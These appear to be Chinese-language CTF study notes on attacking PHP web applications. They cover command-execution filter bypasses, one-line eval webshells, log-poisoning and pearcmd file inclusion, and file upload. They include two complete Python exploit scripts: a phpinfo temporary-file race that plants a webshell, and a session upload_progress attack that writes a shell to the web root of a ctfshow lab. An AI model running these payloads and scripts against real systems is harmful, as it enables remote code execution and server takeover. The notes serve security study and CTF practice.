# PHP


# 一.PHP基础

## 0x1 PHP基本概念

即“超文本处理器”，是在服务器端行的脚本语言，尤其适用于web开发并可嵌入HTML中，适合中小型网站的开发。

## 0x2 PHP环境

phpstudy

## 0x3PHP基础语法

基础语法：函数名（函数参数）分号

函数可以有0个或多个函数，无函数就不写

有系统自带函数，用户也可以自定义函数

用?来区分文件和参数部分

参数部分用&区分多个键值对

单个键值对用=分割出 键和值

echo 是一个语言结构，不是一个函数

```
<?php
echo "hello world";
?>
```

$_GET

```
<?php
$a=$_GET['a'];
echo $a;
?>
```

$_POST

```
<?php
$a=$_POST['a'];
echo $a;
?>
```

自定义函数

```
<?php
function add($a,$b) {
return $a+$b;
}
$a=$_POST['a'];
$b=$_POST['b'];
$c=add($a,$b);
echo $c;
?>
```

危险函数

```
<?php
$cmd=$_POST['cmd'];
system($cmd);
?>
```

## 0x4 PHP的命令执行

命令执行一般指目标服务器上的命令执行，也就是远程命令执行。
英文缩写为RCE

◎Remote Command Exec
◎Remote Code Exec

默认讨论的服务器系统为Linux

shell的分号**；**来拆分命令，与**&&**(url编码为%26%26，也可以分隔命令)的区别是：
**&&**需要前面命令执行成功后后面的命令才会执行(短路)，**；**则不管成功与否，两个命令作为两行命令来执行
||也表示或，但不短路

### PHP的Command Exec函数

官方中有6种函数可执行系统命令

◎system
◎passthru
◎exec
◎shell_exec
◎popen
◎pcntl_exec

## 0x5 过滤与绕过

### ◎黑名单过滤的绕过

替换过滤，<u>双写绕过</u>

<u>通配符</u>*指代任意长度的字符

？表示占位符，只指一个字符 

```
error_reporting(0);        //隐藏报错
highlight_file(_FILE_);    //高亮显示源码
```

当我们遇到<u>过滤flag关键字</u>的时候，我们可以用通配符绕过

如果遇到过滤读取文件命令的情况，我们可以替换使用不熟悉但有类似作用的命令

在Linux环境中，反引号 `’  ‘`  表示执行   

如果所有读取文件命令都被过滤，可以通过组合的形式来执行，例如：

```
ls 'echo /bin'  等效于  ls /bin   
```

甚至可以<img src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20221004182108822.png" alt="image-20221004182108822" style="zoom: 67%;" />
（构造复合语法，通过base64编码等方法）
如果base64和echo也被过滤，可以通过变量拼接来绕过关键字
例如<img src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20221004191724118.png" alt="image-20221004191724118" style="zoom: 80%;" />

### ◎符号过滤

1.过滤空格的情况
(1)读取文件时，使用`<>`代替空格
(2)使用`${IFS}`代替空格，也可以使用`$IFS$9`代替空格，bash下甚至可以使用`{cmd,args}`代替空格
(3)控制字符代替空格`%09  %0b  %0c`
(4)字符串截取空格
(5)当然也可以通过burp来爆破一下可用字符表示空格
![image-20220903213502790](https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209032135840.png)

### ◎不回显

能把不回显的数据传输出来让我们看到所用到的数据传输路径，叫做通道

认识一个危险函数：shell_exec
和system函数的区别：shell_exec并不把执行结果输出到当前页面，而是作为字符串返回，如果页面没有事输出这个字符串，我们则看不到结果。

(1)**写入文件、二次返回**(基于文件的数据带出)

无法直接看到信息，将信息写入文件，在通过读取文件进行信息获得
比如写入1.txt，再访问url+1.txt就可实现数据传回
在shell中，我们可以使用>符号来写文件

(2)**DNS通道**

如果当前目录不可写入,可通过DNS解析记录将数据传回

http://www.dnslog.cn/







## 0x6 PHP文件上传机制

![image-20221004223546812](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20221004223546812.png)

![image-20221004223743505](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20221004223743505.png)

![image-20221004224251811](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20221004224251811.png)

![image-20221004224320923](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20221004224320923.png)

![image-20221004224444943](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20221004224444943.png)

### [php弱类型比较]

php弱类型比较中，数字和字符串比较中，字符串转换成数字的过程中，会取字符串前面数字的值作为整个字符串转换成数字的值，比较“1admin”,转换成数字就是1，所以"admin1"的话，因为字符串没有数字，只能转换成0了，所以第一个才会是true。 而最后一个则是被php当成科学计数法的，计算，所以结果都是0，比较时会相等。 0x03: md5碰撞和strcmp函数绕过，可以看我的另外一篇博客。 0x04: is_numeric()函数会判断如果是数字和数字字符串的话，会返回true,否则返回false;

# 二.PHP代码执行

## 0x1 什么是PHP代码执行

可控指PHP可解释执行的代码，PHP中有专门将字符串当做PHP代码执行的语言eval，通过控制eval里面的参数控制PHP代码的执行

```
eval("要执行的PHP代码");
```

## 0x2 代码执行和命令执行的区别

执行参数不同

代码执行的是PHP后者其他语言的代码，比如`phpinfo()`

而命令执行，一般执行的是shell命令，比如`ls /`

system 命令执行
shell_exec 命令执行
eval 代码执行

## 0x3 PHP代码执行的格式

**在PHP语言中，代码分为三种**

### 1.函数调用

函数特征：函数名字，函数参数，返回值

基本的语法：

函数名   （ 参数 ）；

error_reporting   (  0  ) ;

### 2.类方法调用

类的特征：类实例，方法名，方法参数，返回值

？？？动态函数调用
？？？静态函数调用

### 3.语言结构调用

```
echo " ctfshow " ;
```

## 0x4 PHP代码执行后门

```
<?php

eval($_POST[1]);

?>
```

最简单的PHP一句话后门，也叫PHP小马，如果我们想在服务器上(Windows系统)弹出计算器，发送POST请求即可：

```
1=system("calc");
```

——>蚁剑

url地址：xxxxx
连接密码：1

若木马接收代码为`eval($_GET[1]);`
我们需要手动写一个转接头，**加在GET型请求的url后面**：
（GET转POST转接头）

```
?1=eval(\$_POST[1]);
```

## 0x5 代码执行的类型

<u>函数名+函数类型可控=可以执行任意代码</u>

1.危险函数型

![image-20220905205127371](https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209052051444.png)

```
("sys"."tem")=system
<script language="php">eval($_POST[1])</script> 
```

php5.6版本以前的可用

最短木马：

```
<?`$_GET[2]`;&2=
```

# 三.PHP文件包含

该笔记借鉴了CSDN博主「ing_end」的原创文章，
原文链接：https://blog.csdn.net/ing_end/article/details/123886703

### 0x1何为包含：

程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某个函数

的时候，直接调用此文件，无需再次编写，这种调用文件的过程通常称为包含。

### 0x2文件包含漏洞的产生：

程序开发人员都希望代码更加灵活，所以通常会把被包含的文件设置为变量，来进行动态调用，但正是由于这种灵活性，从而导致客户端可以调用任意文件，造成文件包含漏洞。

**文件上传JEG PNG JPEG GlF先上传PNG图片马，然后再包含。**

### 0x3文件包含语句：

include( ) 文件包含失败时，会产生警告，脚本会继续运行。
include_once() 与include()功能相同，文件只会被包含一次。
require( ) 文件包含失败时，会产生错误，直接结束脚本执行。
require_once( ) 与require( )功能相同，文件只会被包含一次。

### 0x4相关配置：

一般来讲，文件包含有本机文件包含和远程文件包含之分：

**本地文件包含**就是可以读取和打开本地文件
**远程文件包含**（http，ftp，php伪协议）就是可以远程加载文件

我们可以通过php.ini来进行配置。如下：
allow_url_fopen=On/Off 本地文件包含(LFI)（开和关都可包含本地文件）
allow_url_include=On/Off 远程文件包含(RFI)

### 0x5伪协议：

计算机中常见的协议:
◎网络层协议：IP协议、ICMP协议、ARP协议、IGMP协议
◎应用层协议：HTTP协议、HTTPS协议、FTP协议、SSH协议、RDP协议、gopher协议、qq拉起协议、百度云盘拉起协议

**PHP中的伪协议**：file协议、php协议、data协议

（一下部分内容摘自charmersix www.charmersix.icu）

### 0x6文件包含高级利用

#### 文件包含可控点

- 文件名可控：可以控制协议头，优先使用data协议
- 后缀可控：可以考虑路径跳转，参考file协议  ../../../../

#### nginx日志包含

nginx 的默认路径 `/var/log/nginx/access.log`

这里我们要使用user-agent，将恶意代码写到里边，如果是其他方式包含，代码将会被编码导致无法执行

![image-20220909192728299](https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209091927344.png)

然后再读取`/var/log/nginx/access.log`执行日志里的恶意代码

常见出错地方（为正确内容）

- 包含的文件路径错误（`/var/log/nginx/access.log）`
- 写入的UA语法错误（`<?php eval($_POST[1]); ?>`）
- 转义错误（`file_put_contents("1.php","<?php eval($_POST[1]);?>");`）

php语法在双引号中的时需要转义，否则判断为空

### 临时文件包含

phpinfo(); 竞争上传，这里有个python2的脚本

```
#!/usr/bin/python 
import sys
import threading
import socket

def setup(host, port):
    TAG="Security Test"
    PAYLOAD="""%s\r
<?php file_put_contents('/tmp/g', '<?=eval($_REQUEST[1])?>')?>\r""" % TAG
    REQ1_DATA="""-----------------------------7dbff1ded0714\r
Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r
Content-Type: text/plain\r
\r
%s
-----------------------------7dbff1ded0714--\r""" % PAYLOAD
    padding="A" * 5000
    REQ1="""POST /phpinfo.php?a="""+padding+""" HTTP/1.1\r
Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie="""+padding+"""\r
HTTP_ACCEPT: """ + padding + """\r
HTTP_USER_AGENT: """+padding+"""\r
HTTP_ACCEPT_LANGUAGE: """+padding+"""\r
HTTP_PRAGMA: """+padding+"""\r
Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
Content-Length: %s\r
Host: %s\r
\r
%s""" %(len(REQ1_DATA),host,REQ1_DATA)
    #modify this to suit the LFI script   
    LFIREQ="""GET /lfi.php?file=%s HTTP/1.1\r
User-Agent: Mozilla/4.0\r
Proxy-Connection: Keep-Alive\r
Host: %s\r
\r
\r
"""
    return (REQ1, TAG, LFIREQ)

def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    

    s.connect((host, port))
    s2.connect((host, port))

    s.send(phpinforeq)
    d = ""
    while len(d) < offset:
        d += s.recv(offset)
    try:
        i = d.index("[tmp_name] =&gt; ")
        fn = d[i+17:i+31]
    except ValueError:
        return None

    s2.send(lfireq % (fn, host))
    d = s2.recv(4096)
    s.close()
    s2.close()

    if d.find(tag) != -1:
        return fn

counter=0
class ThreadWorker(threading.Thread):
    def __init__(self, e, l, m, *args):
        threading.Thread.__init__(self)
        self.event = e
        self.lock =  l
        self.maxattempts = m
        self.args = args

    def run(self):
        global counter
        while not self.event.is_set():
            with self.lock:
                if counter >= self.maxattempts:
                    return
                counter+=1

            try:
                x = phpInfoLFI(*self.args)
                if self.event.is_set():
                    break                
                if x:
                    print "\nGot it! Shell created in /tmp/g"
                    self.event.set()
                    
            except socket.error:
                return
    

def getOffset(host, port, phpinforeq):
    """Gets offset of tmp_name in the php output"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    s.send(phpinforeq)
    
    d = ""
    while True:
        i = s.recv(4096)
        d+=i        
        if i == "":
            break
        # detect the final chunk
        if i.endswith("0\r\n\r\n"):
            break
    s.close()
    i = d.find("[tmp_name] =&gt; ")
    if i == -1:
        raise ValueError("No php tmp_name in phpinfo output")
    
    print "found %s at %i" % (d[i:i+10],i)
    # padded up a bit
    return i+256

def main():
    
    print "LFI With PHPInfo()"
    print "-=" * 30

    if len(sys.argv) < 2:
        print "Usage: %s host [port] [threads]" % sys.argv[0]
        sys.exit(1)

    try:
        host = socket.gethostbyname(sys.argv[1])
    except socket.error, e:
        print "Error with hostname %s: %s" % (sys.argv[1], e)
        sys.exit(1)

    port=80
    try:
        port = int(sys.argv[2])
    except IndexError:
        pass
    except ValueError, e:
        print "Error with port %d: %s" % (sys.argv[2], e)
        sys.exit(1)
    
    poolsz=10
    try:
        poolsz = int(sys.argv[3])
    except IndexError:
        pass
    except ValueError, e:
        print "Error with poolsz %d: %s" % (sys.argv[3], e)
        sys.exit(1)

    print "Getting initial offset...",  
    reqphp, tag, reqlfi = setup(host, port)
    offset = getOffset(host, port, reqphp)
    sys.stdout.flush()

    maxattempts = 1000
    e = threading.Event()
    l = threading.Lock()

    print "Spawning worker pool (%d)..." % poolsz
    sys.stdout.flush()

    tp = []
    for i in range(0,poolsz):
        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))

    for t in tp:
        t.start()
    try:
        while not e.wait(1):
            if e.is_set():
                break
            with l:
                sys.stdout.write( "\r% 4d / % 4d" % (counter, maxattempts))
                sys.stdout.flush()
                if counter >= maxattempts:
                    break
        print
        if e.is_set():
            print "Woot!  \m/"
        else:
            print ":("
    except KeyboardInterrupt:
        print "\nTelling threads to shutdown..."
        e.set()
    
    print "Shuttin' down..."
    for t in tp:
        t.join()

if __name__=="__main__":
    main()
```

### session文件包含（upload_progress文件上传）

有包含点，且`PHP_SESSION_UPLOAD_PROGRESS`不变时，可以使用此脚本

`session_upload_progress`最初是php为上传进度条设计的一个功能，在上传文件较大的情况下，PHP将进行流式上传，并将进度信息放在session中，此时即使用户没有初始化session，php也会自动初始化session。而且，默认情况下`session.uoload_progress.enabled`是为`on`的，也就是说这个特性默认开启。所以，我们可以通过这个特性来在目标主机上初始化session。

从上面可以看到，session中一部分数据`（session.uoload_progress.enabled）`是用户自己控制的。那么我们只要在文件上传的时候，同时post一个恶意字段`PHP_SESSION_UPLOAD_PROGRESS`，目标服务器的PHP就会自动启用session，session文件将会自动创建。

```
import requests
import threading
session=requests.session()
sess='ctfshow'
url="http://6eb9a422-f96b-4a44-a67d-0d9f9d3e716f.challenges.ctfer.com:8080/" #靶场地址


data1={
        'PHP_SESSION_UPLOAD_PROGRESS':'<?php echo "success";file_put_contents("/var/www/html/1.php","<?php eval(\\$_POST[1]);?>");?>'
}
file={
        'file':'ctfshow'
}
cookies={
        'PHPSESSID': sess
}

def write():
        while True:
                r = session.post(url,data=data1,files=file,cookies=cookies)
def read():
        while True:
                r = session.get(url+"?file=../../../../../../../tmp/sess_ctfshow")
                if 'success' in r.text:
                        print("shell 地址为："+url+"1.php")
                        exit()
                        
threads = [threading.Thread(target=write),
       threading.Thread(target=read)]
for t in threads:
        t.start()
```

### pear文件包含

pear模块下有很多php文件，可以利用其中的某个php，分析发现`/usr/local/lib/php/PEAR/Command/Install.php`存在可利用点

`/usr/local/lib/php/pearcmd.php`存在可利用点

![image-20220909214644657](https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209092146690.png)

argv注册功能开启了就可以使用这种姿势

可以通过配置文件写入一句话木马

```
?file=/usr/local/lib/php/pearcmd.php&aaaa+config-create+/var/www/html/<?=`$_POST[1]`;?>+1.php
```

其中aaa可以将数据弹出argv，三个➕，四个元素

### 远程文件包含

这里是结合了上边的日志包含，或者可以理解成远程日志包含

这里由于题目过滤了符号. 所以我们可以用http://www.ab173.com/net/ip2int.php 将IP转换成纯数字

![image-20220909220415037](https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209092204124.png)

# 四.文件上传

### 0x1 何为文件上传：

- 文件上传就是通过流的方式将文件写到服务器上
- 文件上传必须以POST提交表单
- 表单中需要 `<input type="file" name="upload">`

一句话木马(具体内容写在[这篇文章](https://scofield.top/web/%E6%8A%80%E8%83%BD%E5%82%A8%E5%A4%87/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/))：

```
<?php eval($_POST['a']) ?>
```

其中eval就是执行命令的函数，**$_POST[‘a’]**就是接收的数据。eval函数把接收的数据当作PHP代码来执行。这样我们就能够让插入了一句话木马的网站执行我们传递过去的任意PHP语句。

### 0x2 文件上传漏洞类型

<img src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20221108164430450.png" alt="image-20221108164430450" style="zoom: 67%;" />

### 0x3 实例

去bugku、ctfhub刷题就好了，这里就不赘述了
